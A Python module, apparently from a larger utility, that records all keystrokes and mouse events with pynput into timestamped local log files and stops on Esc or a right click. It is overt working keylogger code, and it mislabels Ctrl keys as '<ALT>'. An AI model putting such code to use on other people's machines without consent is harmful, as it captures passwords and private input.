import os
from datetime import datetime
from pynput.mouse import Listener as ListenerMouse
from pynput.keyboard import Listener as ListenerKeyboard
from module.helper.PrintHandler import printHeaderCustom, printInformation

KEY_LOG_FILE = "./files/log/key-log-" + datetime.today().strftime('%d%m%Y%H%M%S')
MOUSE_LOG_FILE = "./files/log/mouse-log-" + datetime.today().strftime('%d%m%Y%H%M%S')

def onKeyPressed(key):
    key = str(key).replace("'", "")

    if key == 'Key.esc':
        printInformation("Logging stopped.")
        os._exit(1)

    if key == "":
        key = ""
    elif key == "Key.enter":
        key = "\n"
    elif key == "Key.backspace":
        key = "\b"
    elif key == "Key.alt" or key == "Key.alt_l" or key == "Key.alt_gr" or key == "Key.alt_r":
        key = "<ALT>"
    elif key == "Key.ctrl" or key == "Key.ctrl_l" or key == "Key.ctrl_r":
        key = "<ALT>"
    elif key == "Key.cmd" or key == "Key.cmd_l" or key == "Key.cmd_r":
        key = "<CMD>"
    elif key == "Key.delete":
        key = "<DELETE>"
    elif key == "Key.end":
        key = "<END>"
    elif key == "Key.home":
        key = "<HOME>"
    elif key == "Key.insert":
        key = "<INSERT>"
    elif key == "Key.page_down":
        key = "<PAGE_DOWN>"
    elif key == "Key.page_up":
        key = "<PAGE_UP>"
    elif key == "Key.print_screen":
        key = "<PRINT_SCREEN>"
    elif key == "Key.scroll_lock":
        key = "<SCROLL_LOCK>"
    elif key == "Key.shift" or key == "Key.shift_l" or key == "Key.shift_r":
        key = "<SHIFT>"
    elif key == "Key.space":
        key = " "
    elif key == "Key.tab":
        key = "\t"
    elif key == "Key.up":
        key = "<ARROW_UP>"
    elif key == "Key.left":
        key = "<ARROW_LEFT>"
    elif key == "Key.right":
        key = "<ARROW_RIGHT>"
    elif key == "Key.down":
        key = "<ARROW_DOWN>"
    print(key)
    with open(KEY_LOG_FILE, "a") as f:
        f.write(key)


def onMouseMove(x, y):
    message = f"Moved to {(x, y)}\n"
    with open(MOUSE_LOG_FILE, "a") as f:
        f.write(message)


def onMouseClick(x, y, button, pressed):
    if str(button) == "Button.right":
        printInformation("Logging stopped.")
        os._exit(1)

    if pressed:
        message = f"Pressed at {(x, y)}\n"
    else:
        message = f"Released at {(x, y)}\n"
    with open(MOUSE_LOG_FILE, "a") as f:
        f.write(message)


def onMouseScroll(x, y, dx, dy):
    message = f"Scrolled at {(x, y)}\n"
    with open(MOUSE_LOG_FILE, "a") as f:
        f.write(message)


def logging(arguments):
    if arguments.get("KEYBOARD") and arguments.get("MOUSE"):
        printHeaderCustom(message="Logging Keyboard and Mouse ")
        printInformation("Logging Keyboard Result: " + KEY_LOG_FILE)
        printInformation("Logging Mouse Result: " + MOUSE_LOG_FILE)

        listenerMouse = ListenerMouse(on_move=onMouseMove, on_click=onMouseClick, on_scroll=onMouseScroll)
        listenerKeyboard = ListenerKeyboard(on_press=onKeyPressed)
        listenerKeyboard.start()
        listenerMouse.start()
        listenerKeyboard.join()
        listenerMouse.join()

    elif arguments.get("KEYBOARD"):
        printHeaderCustom(message="Logging Keyboard ")
        printInformation("Logging Keyboard Result: " + KEY_LOG_FILE)

        listenerKeyboard = ListenerKeyboard(on_press=onKeyPressed)
        listenerKeyboard.start()
        listenerKeyboard.join()

    elif arguments.get("MOUSE"):
        printHeaderCustom(message="Logging Mouse ")
        printInformation("Logging Mouse Result: " + MOUSE_LOG_FILE)

        listenerMouse = ListenerMouse(on_move=onMouseMove, on_click=onMouseClick, on_scroll=onMouseScroll)
        listenerMouse.start()
        listenerMouse.join()
